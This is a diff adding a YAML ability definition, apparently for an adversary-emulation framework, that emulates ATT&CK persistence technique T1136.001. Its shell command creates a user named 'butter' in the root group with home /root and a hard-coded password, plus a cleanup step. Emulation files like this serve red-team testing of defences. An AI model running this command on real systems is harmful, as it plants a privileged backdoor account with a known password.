@@ -1,0 +1,19 @@
+---
+- id: cbaeea20cd3e11d2bf3512f91b155410
+  name: Create a new user in Linux with `root` UID and GID.
+  description: 'Creates a new user in Linux and adds the user to the `root` group.
+    This technique was used by adversaries during the Butter attack campaign.
+
+    '
+  tactic: persistence
+  technique:
+    attack_id: T1136.001
+    name: 'Create Account: Local Account'
+  platforms:
+    linux:
+      sh:
+        command: 'useradd -g 0 -M -d /root -s /bin/bash butter; if [ $(cat /etc/os-release
+          | grep -i ''Name="ubuntu"'') ]; then echo "butter:BetterWithButter" | sudo
+          chpasswd; else echo "BetterWithButter" | passwd --stdin butter; fi; '
+        payloads: []
+        cleanup: userdel butter
